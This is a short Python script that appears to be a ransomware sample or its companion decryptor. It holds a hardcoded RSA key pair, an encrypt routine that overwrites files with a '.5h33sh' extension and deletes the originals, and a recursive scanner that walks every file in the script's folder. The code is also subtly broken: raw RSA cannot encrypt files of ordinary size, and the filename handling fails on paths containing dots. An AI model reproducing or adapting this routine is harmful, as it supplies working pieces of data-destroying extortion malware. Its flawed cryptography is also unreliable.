import os
import base64
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import binascii
pubKey = b'-----BEGIN PUBLIC KEY-----\nMIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAmOYeClXLaRz3sLloMuqM\nfckQfbqfFd6RrAMhWbK6XzVDmj2AJnsLtij3/UTpT3j8X2MpYlmhDPyWgPNW9k39\nafrW8jFpL9frqNOfGOtJLP2CGHgCn/zXCGJFmI8UQzu1eF6UFdlYsUwx0Z+Ia4Vp\nmS3cTXjjaCAb8TTNnjtpWKwCJjYBnZuxQIvoIG3Nl2a6tgKZdSCdMzD0nR8sj60f\nE9zKpHh0MPCW8YBMGzZmIyzS7NU5dugP3YcaRaQh8G6R+Vbi5ENsVkiFot6NA5Av\nuDfUqHLr30qF++G7oK7U2+LzppqlnmhwcFSlfeqENTippcQk5iLCgnfG2+qakKEI\ni0pVYfRUMJOpAec0ZB1G6vZA2D6ynoPSkK3vfYl7V3Nch9D1QOcJ/1CSFsBuP6gy\n8rPpQ+Oc7bhxfxhxohTv1LC8y0xYZIKtpb9cczDkGy1WVypVOuMhmFWCS4dcmK0G\nLXnpG3kRvEx1f19JsTv1SThL4cbrsDUL+nNzCFXpnt3JAgMBAAE=\n-----END PUBLIC KEY-----'
pubKey = RSA.import_key(pubKey)

privateKey = b'-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----'
key = RSA.import_key(privateKey)
def encrypt(dataFile, publicKey):
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()  
    # convert data to bytes
    data = bytes(data)
    encryptor = PKCS1_OAEP.new(publicKey)
    encrypted = encryptor.encrypt(data)
    fileName= dataFile.split(extension)[0]
    fileExtension = '.5h33sh'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
    	f.write(encrypted)
    os.remove(dataFile)
def decrypt(dataFile, privateKey):
    with open(dataFile, 'rb') as f:
        ciphertext = f.read()
    decryptor = PKCS1_OAEP.new(privateKey)
    data = decryptor.decrypt(ciphertext)
    [ fileName, fileExtension ] = str(dataFile).split('.')
    decryptedFile = fileName + '_decrypted.' + fileExtension
    with open(decryptedFile, 'wb') as f:
        f.write(data)
def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)
path = os.path.dirname(os.path.realpath(__file__))
excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
for item in scanRecurse(path): 
	filePath = Path(item)
	fileType = filePath.suffix.lower()
	if fileType in excludeExtension:
	    continue
	decrypt(filePath,key)